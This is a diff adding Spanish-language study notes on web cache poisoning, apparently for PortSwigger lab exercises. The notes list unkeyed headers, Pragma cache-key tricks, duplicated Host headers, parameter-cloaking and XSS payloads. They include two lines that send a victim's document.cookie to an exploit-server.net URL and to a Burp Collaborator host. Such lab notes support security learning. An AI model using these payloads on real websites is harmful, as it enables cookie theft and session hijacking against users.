@@ -1,0 +1,56 @@
+X-Forwarded-Host:
+X-Host:
+X-Forwarded-Server: 
+X-HTTP-Host-Override
+Forwarded
+
+
+Para sacar el webcache miss
+Pragma: x-get-cache-key
+Pragma: akamai-x-get-cache-key
+
+
+GET /HTTP/1.1
+Host: lab.net
+Host: exploit.net
+
+ruta Exploitserver --> /resources/js/tracking.js
+body ExploitServer --> alert(document.cookie)
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+/-/-/ RECIBIR COOKIES DE LA VíCTIMA /-/-/
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+en el body del epxploit server
+fetch('https://exploit-0a5800b504dde22cdcb5a7be011d009d.exploit-server.net/?cookies=' + encodeURIComponent(document.cookie));
+^ es del ejercicio de arriba
+
+Tal y cómo está añadimos a la última línea en GET /
+X-Forwarded-Host: exploitserver.com  --> nos fijamos en el response si se duplica esta URL cuando esté la cache en hit y copiamos /resources/tracking.js
+X-Forwarded-For: exploitserver.com --> probar is no funciona
+alert(document.cookie) --> en exploit
+
+en una cookie rara
+cookie: session=adsass; fehost:"-alert(1)-"
+
+Buscar el Js donde nos responde con un 302 y un Location:serverexploit/tracking/tracking.js
+x-Forwarded-Scheme: http
+x-Forwarded-Host: exploitserver.com
+
+Vary: user-agent -->  nos fijamos en los Js, tendremos que robar a la víctima la cabecera que esté aquí dentro, ya que el user-agent está keyed
+X-Host: exploitserver.net y añadimos ruta de js duplicado en el response al exploit para poner document.cookie
+/resources/js/tracking.js
+
+nos chiva qué está añadido a la key
+GET /?loquesea='/><script>alert(1)</script> HTTP/2
+Pragma: x-get-cache-key 
+
+Extensiones --> Param Miner --< guess everithyng --< extensions --> Output --> nos fijamos en qué parámeros reporta
+/?parametroreportado='/><script>alert(1)</script> 
+/?utm_content='/><script><@burp_urlencode>fetch("https://m0nckht7kyvq0d3n793ad2ey2p8fw4.burpcollaborator.net/?c="+document.cookies)<@/burp_urlencode></script>
+
+GET /js/geolocate.js?callback=setCountryCookie
+callback=alert(1) --> hay un valor en el js, podemos añadir un alert
+
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=sexeandoprimo;callback=alert(1) --< Param Miner encuentra utm_content y metemos ; o &
+
+/latassaas</p><script>alert(1)</script><p>sex --> ver que respuesta da sin ?
